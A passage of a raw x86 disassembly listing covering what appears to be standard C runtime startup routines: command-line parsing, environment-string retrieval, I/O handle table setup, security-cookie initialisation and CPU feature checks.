  405a35:	80 3e 00             	cmpb   $0x0,(%esi)
  405a38:	0f 84 e9 00 00 00    	je     0x405b27
  405a3e:	8a 06                	mov    (%esi),%al
  405a40:	3c 20                	cmp    $0x20,%al
  405a42:	74 04                	je     0x405a48
  405a44:	3c 09                	cmp    $0x9,%al
  405a46:	75 06                	jne    0x405a4e
  405a48:	46                   	inc    %esi
  405a49:	eb f3                	jmp    0x405a3e
  405a4b:	4e                   	dec    %esi
  405a4c:	eb e3                	jmp    0x405a31
  405a4e:	80 3e 00             	cmpb   $0x0,(%esi)
  405a51:	0f 84 d0 00 00 00    	je     0x405b27
  405a57:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405a5b:	74 09                	je     0x405a66
  405a5d:	8b 45 08             	mov    0x8(%ebp),%eax
  405a60:	83 45 08 04          	addl   $0x4,0x8(%ebp)
  405a64:	89 10                	mov    %edx,(%eax)
  405a66:	ff 01                	incl   (%ecx)
  405a68:	33 db                	xor    %ebx,%ebx
  405a6a:	43                   	inc    %ebx
  405a6b:	33 c9                	xor    %ecx,%ecx
  405a6d:	eb 02                	jmp    0x405a71
  405a6f:	46                   	inc    %esi
  405a70:	41                   	inc    %ecx
  405a71:	80 3e 5c             	cmpb   $0x5c,(%esi)
  405a74:	74 f9                	je     0x405a6f
  405a76:	80 3e 22             	cmpb   $0x22,(%esi)
  405a79:	75 26                	jne    0x405aa1
  405a7b:	f6 c1 01             	test   $0x1,%cl
  405a7e:	75 1f                	jne    0x405a9f
  405a80:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405a84:	74 0c                	je     0x405a92
  405a86:	8d 46 01             	lea    0x1(%esi),%eax
  405a89:	80 38 22             	cmpb   $0x22,(%eax)
  405a8c:	75 04                	jne    0x405a92
  405a8e:	8b f0                	mov    %eax,%esi
  405a90:	eb 0d                	jmp    0x405a9f
  405a92:	33 c0                	xor    %eax,%eax
  405a94:	33 db                	xor    %ebx,%ebx
  405a96:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405a99:	0f 94 c0             	sete   %al
  405a9c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a9f:	d1 e9                	shr    $1,%ecx
  405aa1:	85 c9                	test   %ecx,%ecx
  405aa3:	74 12                	je     0x405ab7
  405aa5:	49                   	dec    %ecx
  405aa6:	85 d2                	test   %edx,%edx
  405aa8:	74 04                	je     0x405aae
  405aaa:	c6 02 5c             	movb   $0x5c,(%edx)
  405aad:	42                   	inc    %edx
  405aae:	ff 07                	incl   (%edi)
  405ab0:	85 c9                	test   %ecx,%ecx
  405ab2:	75 f1                	jne    0x405aa5
  405ab4:	89 55 0c             	mov    %edx,0xc(%ebp)
  405ab7:	8a 06                	mov    (%esi),%al
  405ab9:	84 c0                	test   %al,%al
  405abb:	74 55                	je     0x405b12
  405abd:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  405ac1:	75 08                	jne    0x405acb
  405ac3:	3c 20                	cmp    $0x20,%al
  405ac5:	74 4b                	je     0x405b12
  405ac7:	3c 09                	cmp    $0x9,%al
  405ac9:	74 47                	je     0x405b12
  405acb:	85 db                	test   %ebx,%ebx
  405acd:	74 3d                	je     0x405b0c
  405acf:	85 d2                	test   %edx,%edx
  405ad1:	0f be c0             	movsbl %al,%eax
  405ad4:	50                   	push   %eax
  405ad5:	74 23                	je     0x405afa
  405ad7:	e8 da 1c 00 00       	call   0x4077b6
  405adc:	85 c0                	test   %eax,%eax
  405ade:	59                   	pop    %ecx
  405adf:	74 0d                	je     0x405aee
  405ae1:	8a 06                	mov    (%esi),%al
  405ae3:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405ae6:	ff 45 0c             	incl   0xc(%ebp)
  405ae9:	88 01                	mov    %al,(%ecx)
  405aeb:	46                   	inc    %esi
  405aec:	ff 07                	incl   (%edi)
  405aee:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405af1:	8a 06                	mov    (%esi),%al
  405af3:	ff 45 0c             	incl   0xc(%ebp)
  405af6:	88 01                	mov    %al,(%ecx)
  405af8:	eb 0d                	jmp    0x405b07
  405afa:	e8 b7 1c 00 00       	call   0x4077b6
  405aff:	85 c0                	test   %eax,%eax
  405b01:	59                   	pop    %ecx
  405b02:	74 03                	je     0x405b07
  405b04:	46                   	inc    %esi
  405b05:	ff 07                	incl   (%edi)
  405b07:	ff 07                	incl   (%edi)
  405b09:	8b 55 0c             	mov    0xc(%ebp),%edx
  405b0c:	46                   	inc    %esi
  405b0d:	e9 56 ff ff ff       	jmp    0x405a68
  405b12:	85 d2                	test   %edx,%edx
  405b14:	74 07                	je     0x405b1d
  405b16:	c6 02 00             	movb   $0x0,(%edx)
  405b19:	42                   	inc    %edx
  405b1a:	89 55 0c             	mov    %edx,0xc(%ebp)
  405b1d:	ff 07                	incl   (%edi)
  405b1f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405b22:	e9 0e ff ff ff       	jmp    0x405a35
  405b27:	8b 45 08             	mov    0x8(%ebp),%eax
  405b2a:	85 c0                	test   %eax,%eax
  405b2c:	5e                   	pop    %esi
  405b2d:	5b                   	pop    %ebx
  405b2e:	74 03                	je     0x405b33
  405b30:	83 20 00             	andl   $0x0,(%eax)
  405b33:	ff 01                	incl   (%ecx)
  405b35:	c9                   	leave
  405b36:	c3                   	ret
  405b37:	55                   	push   %ebp
  405b38:	8b ec                	mov    %esp,%ebp
  405b3a:	83 ec 0c             	sub    $0xc,%esp
  405b3d:	53                   	push   %ebx
  405b3e:	33 db                	xor    %ebx,%ebx
  405b40:	39 1d 18 d9 40 00    	cmp    %ebx,0x40d918
  405b46:	56                   	push   %esi
  405b47:	57                   	push   %edi
  405b48:	75 05                	jne    0x405b4f
  405b4a:	e8 87 e2 ff ff       	call   0x403dd6
  405b4f:	68 04 01 00 00       	push   $0x104
  405b54:	be a0 d5 40 00       	mov    $0x40d5a0,%esi
  405b59:	56                   	push   %esi
  405b5a:	53                   	push   %ebx
  405b5b:	88 1d a4 d6 40 00    	mov    %bl,0x40d6a4
  405b61:	ff 15 20 90 40 00    	call   *0x409020
  405b67:	a1 08 d9 40 00       	mov    0x40d908,%eax
  405b6c:	3b c3                	cmp    %ebx,%eax
  405b6e:	89 35 8c d0 40 00    	mov    %esi,0x40d08c
  405b74:	74 07                	je     0x405b7d
  405b76:	38 18                	cmp    %bl,(%eax)
  405b78:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405b7b:	75 03                	jne    0x405b80
  405b7d:	89 75 fc             	mov    %esi,-0x4(%ebp)
  405b80:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405b83:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405b86:	50                   	push   %eax
  405b87:	53                   	push   %ebx
  405b88:	53                   	push   %ebx
  405b89:	8d 7d f4             	lea    -0xc(%ebp),%edi
  405b8c:	e8 0e fe ff ff       	call   0x40599f
  405b91:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405b94:	83 c4 0c             	add    $0xc,%esp
  405b97:	3d ff ff ff 3f       	cmp    $0x3fffffff,%eax
  405b9c:	73 4a                	jae    0x405be8
  405b9e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405ba1:	83 f9 ff             	cmp    $0xffffffff,%ecx
  405ba4:	73 42                	jae    0x405be8
  405ba6:	8b f8                	mov    %eax,%edi
  405ba8:	c1 e7 02             	shl    $0x2,%edi
  405bab:	8d 04 0f             	lea    (%edi,%ecx,1),%eax
  405bae:	3b c1                	cmp    %ecx,%eax
  405bb0:	72 36                	jb     0x405be8
  405bb2:	50                   	push   %eax
  405bb3:	e8 8e e5 ff ff       	call   0x404146
  405bb8:	8b f0                	mov    %eax,%esi
  405bba:	3b f3                	cmp    %ebx,%esi
  405bbc:	59                   	pop    %ecx
  405bbd:	74 29                	je     0x405be8
  405bbf:	8b 55 fc             	mov    -0x4(%ebp),%edx
  405bc2:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405bc5:	50                   	push   %eax
  405bc6:	03 fe                	add    %esi,%edi
  405bc8:	57                   	push   %edi
  405bc9:	56                   	push   %esi
  405bca:	8d 7d f4             	lea    -0xc(%ebp),%edi
  405bcd:	e8 cd fd ff ff       	call   0x40599f
  405bd2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  405bd5:	83 c4 0c             	add    $0xc,%esp
  405bd8:	48                   	dec    %eax
  405bd9:	a3 70 d0 40 00       	mov    %eax,0x40d070
  405bde:	89 35 74 d0 40 00    	mov    %esi,0x40d074
  405be4:	33 c0                	xor    %eax,%eax
  405be6:	eb 03                	jmp    0x405beb
  405be8:	83 c8 ff             	or     $0xffffffff,%eax
  405beb:	5f                   	pop    %edi
  405bec:	5e                   	pop    %esi
  405bed:	5b                   	pop    %ebx
  405bee:	c9                   	leave
  405bef:	c3                   	ret
  405bf0:	51                   	push   %ecx
  405bf1:	51                   	push   %ecx
  405bf2:	a1 a8 d6 40 00       	mov    0x40d6a8,%eax
  405bf7:	53                   	push   %ebx
  405bf8:	55                   	push   %ebp
  405bf9:	56                   	push   %esi
  405bfa:	57                   	push   %edi
  405bfb:	8b 3d 30 91 40 00    	mov    0x409130,%edi
  405c01:	33 db                	xor    %ebx,%ebx
  405c03:	33 f6                	xor    %esi,%esi
  405c05:	3b c3                	cmp    %ebx,%eax
  405c07:	6a 02                	push   $0x2
  405c09:	5d                   	pop    %ebp
  405c0a:	75 2d                	jne    0x405c39
  405c0c:	ff d7                	call   *%edi
  405c0e:	8b f0                	mov    %eax,%esi
  405c10:	3b f3                	cmp    %ebx,%esi
  405c12:	74 0c                	je     0x405c20
  405c14:	c7 05 a8 d6 40 00 01 	movl   $0x1,0x40d6a8
  405c1b:	00 00 00 
  405c1e:	eb 22                	jmp    0x405c42
  405c20:	ff 15 c0 90 40 00    	call   *0x4090c0
  405c26:	83 f8 78             	cmp    $0x78,%eax
  405c29:	75 09                	jne    0x405c34
  405c2b:	8b c5                	mov    %ebp,%eax
  405c2d:	a3 a8 d6 40 00       	mov    %eax,0x40d6a8
  405c32:	eb 05                	jmp    0x405c39
  405c34:	a1 a8 d6 40 00       	mov    0x40d6a8,%eax
  405c39:	83 f8 01             	cmp    $0x1,%eax
  405c3c:	0f 85 84 00 00 00    	jne    0x405cc6
  405c42:	3b f3                	cmp    %ebx,%esi
  405c44:	75 0f                	jne    0x405c55
  405c46:	ff d7                	call   *%edi
  405c48:	8b f0                	mov    %eax,%esi
  405c4a:	3b f3                	cmp    %ebx,%esi
  405c4c:	75 07                	jne    0x405c55
  405c4e:	33 c0                	xor    %eax,%eax
  405c50:	e9 c9 00 00 00       	jmp    0x405d1e
  405c55:	66 39 1e             	cmp    %bx,(%esi)
  405c58:	8b c6                	mov    %esi,%eax
  405c5a:	74 0e                	je     0x405c6a
  405c5c:	03 c5                	add    %ebp,%eax
  405c5e:	66 39 18             	cmp    %bx,(%eax)
  405c61:	75 f9                	jne    0x405c5c
  405c63:	03 c5                	add    %ebp,%eax
  405c65:	66 39 18             	cmp    %bx,(%eax)
  405c68:	75 f2                	jne    0x405c5c
  405c6a:	8b 3d 2c 91 40 00    	mov    0x40912c,%edi
  405c70:	53                   	push   %ebx
  405c71:	53                   	push   %ebx
  405c72:	53                   	push   %ebx
  405c73:	2b c6                	sub    %esi,%eax
  405c75:	53                   	push   %ebx
  405c76:	d1 f8                	sar    $1,%eax
  405c78:	40                   	inc    %eax
  405c79:	50                   	push   %eax
  405c7a:	56                   	push   %esi
  405c7b:	53                   	push   %ebx
  405c7c:	53                   	push   %ebx
  405c7d:	89 44 24 34          	mov    %eax,0x34(%esp)
  405c81:	ff d7                	call   *%edi
  405c83:	8b e8                	mov    %eax,%ebp
  405c85:	3b eb                	cmp    %ebx,%ebp
  405c87:	74 32                	je     0x405cbb
  405c89:	55                   	push   %ebp
  405c8a:	e8 b7 e4 ff ff       	call   0x404146
  405c8f:	3b c3                	cmp    %ebx,%eax
  405c91:	59                   	pop    %ecx
  405c92:	89 44 24 10          	mov    %eax,0x10(%esp)
  405c96:	74 23                	je     0x405cbb
  405c98:	53                   	push   %ebx
  405c99:	53                   	push   %ebx
  405c9a:	55                   	push   %ebp
  405c9b:	50                   	push   %eax
  405c9c:	ff 74 24 24          	push   0x24(%esp)
  405ca0:	56                   	push   %esi
  405ca1:	53                   	push   %ebx
  405ca2:	53                   	push   %ebx
  405ca3:	ff d7                	call   *%edi
  405ca5:	85 c0                	test   %eax,%eax
  405ca7:	75 0e                	jne    0x405cb7
  405ca9:	ff 74 24 10          	push   0x10(%esp)
  405cad:	e8 dd cf ff ff       	call   0x402c8f
  405cb2:	59                   	pop    %ecx
  405cb3:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  405cb7:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  405cbb:	56                   	push   %esi
  405cbc:	ff 15 28 91 40 00    	call   *0x409128
  405cc2:	8b c3                	mov    %ebx,%eax
  405cc4:	eb 58                	jmp    0x405d1e
  405cc6:	3b c5                	cmp    %ebp,%eax
  405cc8:	74 04                	je     0x405cce
  405cca:	3b c3                	cmp    %ebx,%eax
  405ccc:	75 80                	jne    0x405c4e
  405cce:	ff 15 24 91 40 00    	call   *0x409124
  405cd4:	8b f0                	mov    %eax,%esi
  405cd6:	3b f3                	cmp    %ebx,%esi
  405cd8:	0f 84 70 ff ff ff    	je     0x405c4e
  405cde:	38 1e                	cmp    %bl,(%esi)
  405ce0:	74 0a                	je     0x405cec
  405ce2:	40                   	inc    %eax
  405ce3:	38 18                	cmp    %bl,(%eax)
  405ce5:	75 fb                	jne    0x405ce2
  405ce7:	40                   	inc    %eax
  405ce8:	38 18                	cmp    %bl,(%eax)
  405cea:	75 f6                	jne    0x405ce2
  405cec:	2b c6                	sub    %esi,%eax
  405cee:	40                   	inc    %eax
  405cef:	8b e8                	mov    %eax,%ebp
  405cf1:	55                   	push   %ebp
  405cf2:	e8 4f e4 ff ff       	call   0x404146
  405cf7:	8b f8                	mov    %eax,%edi
  405cf9:	3b fb                	cmp    %ebx,%edi
  405cfb:	59                   	pop    %ecx
  405cfc:	75 0c                	jne    0x405d0a
  405cfe:	56                   	push   %esi
  405cff:	ff 15 20 91 40 00    	call   *0x409120
  405d05:	e9 44 ff ff ff       	jmp    0x405c4e
  405d0a:	55                   	push   %ebp
  405d0b:	56                   	push   %esi
  405d0c:	57                   	push   %edi
  405d0d:	e8 ee cb ff ff       	call   0x402900
  405d12:	83 c4 0c             	add    $0xc,%esp
  405d15:	56                   	push   %esi
  405d16:	ff 15 20 91 40 00    	call   *0x409120
  405d1c:	8b c7                	mov    %edi,%eax
  405d1e:	5f                   	pop    %edi
  405d1f:	5e                   	pop    %esi
  405d20:	5d                   	pop    %ebp
  405d21:	5b                   	pop    %ebx
  405d22:	59                   	pop    %ecx
  405d23:	59                   	pop    %ecx
  405d24:	c3                   	ret
  405d25:	6a 54                	push   $0x54
  405d27:	68 90 af 40 00       	push   $0x40af90
  405d2c:	e8 23 e2 ff ff       	call   0x403f54
  405d31:	33 ff                	xor    %edi,%edi
  405d33:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405d36:	8d 45 9c             	lea    -0x64(%ebp),%eax
  405d39:	50                   	push   %eax
  405d3a:	ff 15 e0 90 40 00    	call   *0x4090e0
  405d40:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405d47:	6a 40                	push   $0x40
  405d49:	6a 20                	push   $0x20
  405d4b:	5e                   	pop    %esi
  405d4c:	56                   	push   %esi
  405d4d:	e8 34 e4 ff ff       	call   0x404186
  405d52:	59                   	pop    %ecx
  405d53:	59                   	pop    %ecx
  405d54:	3b c7                	cmp    %edi,%eax
  405d56:	0f 84 14 02 00 00    	je     0x405f70
  405d5c:	a3 e0 d7 40 00       	mov    %eax,0x40d7e0
  405d61:	89 35 c4 d7 40 00    	mov    %esi,0x40d7c4
  405d67:	8d 88 00 08 00 00    	lea    0x800(%eax),%ecx
  405d6d:	eb 30                	jmp    0x405d9f
  405d6f:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  405d73:	83 08 ff             	orl    $0xffffffff,(%eax)
  405d76:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  405d7a:	89 78 08             	mov    %edi,0x8(%eax)
  405d7d:	c6 40 24 00          	movb   $0x0,0x24(%eax)
  405d81:	c6 40 25 0a          	movb   $0xa,0x25(%eax)
  405d85:	c6 40 26 0a          	movb   $0xa,0x26(%eax)
  405d89:	89 78 38             	mov    %edi,0x38(%eax)
  405d8c:	c6 40 34 00          	movb   $0x0,0x34(%eax)
  405d90:	83 c0 40             	add    $0x40,%eax
  405d93:	8b 0d e0 d7 40 00    	mov    0x40d7e0,%ecx
  405d99:	81 c1 00 08 00 00    	add    $0x800,%ecx
  405d9f:	3b c1                	cmp    %ecx,%eax
  405da1:	72 cc                	jb     0x405d6f
  405da3:	66 39 7d ce          	cmp    %di,-0x32(%ebp)
  405da7:	0f 84 0a 01 00 00    	je     0x405eb7
  405dad:	8b 45 d0             	mov    -0x30(%ebp),%eax
  405db0:	3b c7                	cmp    %edi,%eax
  405db2:	0f 84 ff 00 00 00    	je     0x405eb7
  405db8:	8b 38                	mov    (%eax),%edi
  405dba:	8d 58 04             	lea    0x4(%eax),%ebx
  405dbd:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  405dc0:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405dc3:	be 00 08 00 00       	mov    $0x800,%esi
  405dc8:	3b fe                	cmp    %esi,%edi
  405dca:	7c 02                	jl     0x405dce
  405dcc:	8b fe                	mov    %esi,%edi
  405dce:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  405dd5:	eb 5b                	jmp    0x405e32
  405dd7:	6a 40                	push   $0x40
  405dd9:	6a 20                	push   $0x20
  405ddb:	e8 a6 e3 ff ff       	call   0x404186
  405de0:	59                   	pop    %ecx
  405de1:	59                   	pop    %ecx
  405de2:	85 c0                	test   %eax,%eax
  405de4:	74 56                	je     0x405e3c
  405de6:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  405de9:	8d 0c 8d e0 d7 40 00 	lea    0x40d7e0(,%ecx,4),%ecx
  405df0:	89 01                	mov    %eax,(%ecx)
  405df2:	83 05 c4 d7 40 00 20 	addl   $0x20,0x40d7c4
  405df9:	8d 90 00 08 00 00    	lea    0x800(%eax),%edx
  405dff:	eb 2a                	jmp    0x405e2b
  405e01:	c6 40 04 00          	movb   $0x0,0x4(%eax)
  405e05:	83 08 ff             	orl    $0xffffffff,(%eax)
  405e08:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  405e0c:	83 60 08 00          	andl   $0x0,0x8(%eax)
  405e10:	80 60 24 80          	andb   $0x80,0x24(%eax)
  405e14:	c6 40 25 0a          	movb   $0xa,0x25(%eax)
  405e18:	c6 40 26 0a          	movb   $0xa,0x26(%eax)
  405e1c:	83 60 38 00          	andl   $0x0,0x38(%eax)
  405e20:	c6 40 34 00          	movb   $0x0,0x34(%eax)
  405e24:	83 c0 40             	add    $0x40,%eax
  405e27:	8b 11                	mov    (%ecx),%edx
  405e29:	03 d6                	add    %esi,%edx
  405e2b:	3b c2                	cmp    %edx,%eax
  405e2d:	72 d2                	jb     0x405e01
  405e2f:	ff 45 e0             	incl   -0x20(%ebp)
  405e32:	39 3d c4 d7 40 00    	cmp    %edi,0x40d7c4
  405e38:	7c 9d                	jl     0x405dd7
  405e3a:	eb 06                	jmp    0x405e42
  405e3c:	8b 3d c4 d7 40 00    	mov    0x40d7c4,%edi
  405e42:	83 65 e0 00          	andl   $0x0,-0x20(%ebp)
  405e46:	85 ff                	test   %edi,%edi
  405e48:	7e 6d                	jle    0x405eb7
  405e4a:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405e4d:	8b 08                	mov    (%eax),%ecx
  405e4f:	83 f9 ff             	cmp    $0xffffffff,%ecx
  405e52:	74 56                	je     0x405eaa
  405e54:	83 f9 fe             	cmp    $0xfffffffe,%ecx
  405e57:	74 51                	je     0x405eaa
  405e59:	8a 03                	mov    (%ebx),%al
  405e5b:	a8 01                	test   $0x1,%al
  405e5d:	74 4b                	je     0x405eaa
  405e5f:	a8 08                	test   $0x8,%al
  405e61:	75 0b                	jne    0x405e6e
  405e63:	51                   	push   %ecx
  405e64:	ff 15 38 91 40 00    	call   *0x409138
  405e6a:	85 c0                	test   %eax,%eax
  405e6c:	74 3c                	je     0x405eaa
  405e6e:	8b 75 e0             	mov    -0x20(%ebp),%esi
  405e71:	8b c6                	mov    %esi,%eax
  405e73:	c1 f8 05             	sar    $0x5,%eax
  405e76:	83 e6 1f             	and    $0x1f,%esi
  405e79:	c1 e6 06             	shl    $0x6,%esi
  405e7c:	03 34 85 e0 d7 40 00 	add    0x40d7e0(,%eax,4),%esi
  405e83:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  405e86:	8b 00                	mov    (%eax),%eax
  405e88:	89 06                	mov    %eax,(%esi)
  405e8a:	8a 03                	mov    (%ebx),%al
  405e8c:	88 46 04             	mov    %al,0x4(%esi)
  405e8f:	68 a0 0f 00 00       	push   $0xfa0
  405e94:	8d 46 0c             	lea    0xc(%esi),%eax
  405e97:	50                   	push   %eax
  405e98:	e8 00 eb ff ff       	call   0x40499d
  405e9d:	59                   	pop    %ecx
  405e9e:	59                   	pop    %ecx
  405e9f:	85 c0                	test   %eax,%eax
  405ea1:	0f 84 c9 00 00 00    	je     0x405f70
  405ea7:	ff 46 08             	incl   0x8(%esi)
  405eaa:	ff 45 e0             	incl   -0x20(%ebp)
  405ead:	43                   	inc    %ebx
  405eae:	83 45 e4 04          	addl   $0x4,-0x1c(%ebp)
  405eb2:	39 7d e0             	cmp    %edi,-0x20(%ebp)
  405eb5:	7c 93                	jl     0x405e4a
  405eb7:	33 db                	xor    %ebx,%ebx
  405eb9:	8b f3                	mov    %ebx,%esi
  405ebb:	c1 e6 06             	shl    $0x6,%esi
  405ebe:	03 35 e0 d7 40 00    	add    0x40d7e0,%esi
  405ec4:	8b 06                	mov    (%esi),%eax
  405ec6:	83 f8 ff             	cmp    $0xffffffff,%eax
  405ec9:	74 0b                	je     0x405ed6
  405ecb:	83 f8 fe             	cmp    $0xfffffffe,%eax
  405ece:	74 06                	je     0x405ed6
  405ed0:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  405ed4:	eb 72                	jmp    0x405f48
  405ed6:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  405eda:	85 db                	test   %ebx,%ebx
  405edc:	75 05                	jne    0x405ee3
  405ede:	6a f6                	push   $0xfffffff6
  405ee0:	58                   	pop    %eax
  405ee1:	eb 0a                	jmp    0x405eed
  405ee3:	8b c3                	mov    %ebx,%eax
  405ee5:	48                   	dec    %eax
  405ee6:	f7 d8                	neg    %eax
  405ee8:	1b c0                	sbb    %eax,%eax
  405eea:	83 c0 f5             	add    $0xfffffff5,%eax
  405eed:	50                   	push   %eax
  405eee:	ff 15 04 91 40 00    	call   *0x409104
  405ef4:	8b f8                	mov    %eax,%edi
  405ef6:	83 ff ff             	cmp    $0xffffffff,%edi
  405ef9:	74 43                	je     0x405f3e
  405efb:	85 ff                	test   %edi,%edi
  405efd:	74 3f                	je     0x405f3e
  405eff:	57                   	push   %edi
  405f00:	ff 15 38 91 40 00    	call   *0x409138
  405f06:	85 c0                	test   %eax,%eax
  405f08:	74 34                	je     0x405f3e
  405f0a:	89 3e                	mov    %edi,(%esi)
  405f0c:	25 ff 00 00 00       	and    $0xff,%eax
  405f11:	83 f8 02             	cmp    $0x2,%eax
  405f14:	75 06                	jne    0x405f1c
  405f16:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  405f1a:	eb 09                	jmp    0x405f25
  405f1c:	83 f8 03             	cmp    $0x3,%eax
  405f1f:	75 04                	jne    0x405f25
  405f21:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  405f25:	68 a0 0f 00 00       	push   $0xfa0
  405f2a:	8d 46 0c             	lea    0xc(%esi),%eax
  405f2d:	50                   	push   %eax
  405f2e:	e8 6a ea ff ff       	call   0x40499d
  405f33:	59                   	pop    %ecx
  405f34:	59                   	pop    %ecx
  405f35:	85 c0                	test   %eax,%eax
  405f37:	74 37                	je     0x405f70
  405f39:	ff 46 08             	incl   0x8(%esi)
  405f3c:	eb 0a                	jmp    0x405f48
  405f3e:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  405f42:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%esi)
  405f48:	43                   	inc    %ebx
  405f49:	83 fb 03             	cmp    $0x3,%ebx
  405f4c:	0f 8c 67 ff ff ff    	jl     0x405eb9
  405f52:	ff 35 c4 d7 40 00    	push   0x40d7c4
  405f58:	ff 15 34 91 40 00    	call   *0x409134
  405f5e:	33 c0                	xor    %eax,%eax
  405f60:	eb 11                	jmp    0x405f73
  405f62:	33 c0                	xor    %eax,%eax
  405f64:	40                   	inc    %eax
  405f65:	c3                   	ret
  405f66:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405f69:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  405f70:	83 c8 ff             	or     $0xffffffff,%eax
  405f73:	e8 21 e0 ff ff       	call   0x403f99
  405f78:	c3                   	ret
  405f79:	55                   	push   %ebp
  405f7a:	8b ec                	mov    %esp,%ebp
  405f7c:	83 ec 10             	sub    $0x10,%esp
  405f7f:	a1 20 c0 40 00       	mov    0x40c020,%eax
  405f84:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  405f88:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405f8c:	53                   	push   %ebx
  405f8d:	57                   	push   %edi
  405f8e:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  405f93:	3b c7                	cmp    %edi,%eax
  405f95:	bb 00 00 ff ff       	mov    $0xffff0000,%ebx
  405f9a:	74 0d                	je     0x405fa9
  405f9c:	85 c3                	test   %eax,%ebx
  405f9e:	74 09                	je     0x405fa9
  405fa0:	f7 d0                	not    %eax
  405fa2:	a3 24 c0 40 00       	mov    %eax,0x40c024
  405fa7:	eb 60                	jmp    0x406009
  405fa9:	56                   	push   %esi
  405faa:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405fad:	50                   	push   %eax
  405fae:	ff 15 48 91 40 00    	call   *0x409148
  405fb4:	8b 75 fc             	mov    -0x4(%ebp),%esi
  405fb7:	33 75 f8             	xor    -0x8(%ebp),%esi
  405fba:	ff 15 44 91 40 00    	call   *0x409144
  405fc0:	33 f0                	xor    %eax,%esi
  405fc2:	ff 15 bc 90 40 00    	call   *0x4090bc
  405fc8:	33 f0                	xor    %eax,%esi
  405fca:	ff 15 40 91 40 00    	call   *0x409140
  405fd0:	33 f0                	xor    %eax,%esi
  405fd2:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405fd5:	50                   	push   %eax
  405fd6:	ff 15 3c 91 40 00    	call   *0x40913c
  405fdc:	8b 45 f4             	mov    -0xc(%ebp),%eax
  405fdf:	33 45 f0             	xor    -0x10(%ebp),%eax
  405fe2:	33 f0                	xor    %eax,%esi
  405fe4:	3b f7                	cmp    %edi,%esi
  405fe6:	75 07                	jne    0x405fef
  405fe8:	be 4f e6 40 bb       	mov    $0xbb40e64f,%esi
  405fed:	eb 0b                	jmp    0x405ffa
  405fef:	85 f3                	test   %esi,%ebx
  405ff1:	75 07                	jne    0x405ffa
  405ff3:	8b c6                	mov    %esi,%eax
  405ff5:	c1 e0 10             	shl    $0x10,%eax
  405ff8:	0b f0                	or     %eax,%esi
  405ffa:	89 35 20 c0 40 00    	mov    %esi,0x40c020
  406000:	f7 d6                	not    %esi
  406002:	89 35 24 c0 40 00    	mov    %esi,0x40c024
  406008:	5e                   	pop    %esi
  406009:	5f                   	pop    %edi
  40600a:	5b                   	pop    %ebx
  40600b:	c9                   	leave
  40600c:	c3                   	ret
  40600d:	6a 0c                	push   $0xc
  40600f:	68 b0 af 40 00       	push   $0x40afb0
  406014:	e8 3b df ff ff       	call   0x403f54
  406019:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40601d:	66 0f 28 c1          	movapd %xmm1,%xmm0
  406021:	c7 45 e4 01 00 00 00 	movl   $0x1,-0x1c(%ebp)
  406028:	eb 23                	jmp    0x40604d
  40602a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40602d:	8b 00                	mov    (%eax),%eax
  40602f:	8b 00                	mov    (%eax),%eax
  406031:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  406036:	74 0a                	je     0x406042
  406038:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40603d:	74 03                	je     0x406042
  40603f:	33 c0                	xor    %eax,%eax
  406041:	c3                   	ret
  406042:	33 c0                	xor    %eax,%eax
  406044:	40                   	inc    %eax
  406045:	c3                   	ret
  406046:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406049:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40604d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406054:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  406057:	e8 3d df ff ff       	call   0x403f99
  40605c:	c3                   	ret
  40605d:	55                   	push   %ebp
  40605e:	8b ec                	mov    %esp,%ebp
  406060:	83 ec 18             	sub    $0x18,%esp
  406063:	33 c0                	xor    %eax,%eax
  406065:	53                   	push   %ebx
  406066:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406069:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40606c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40606f:	53                   	push   %ebx
  406070:	9c                   	pushf
  406071:	58                   	pop    %eax
  406072:	8b c8                	mov    %eax,%ecx
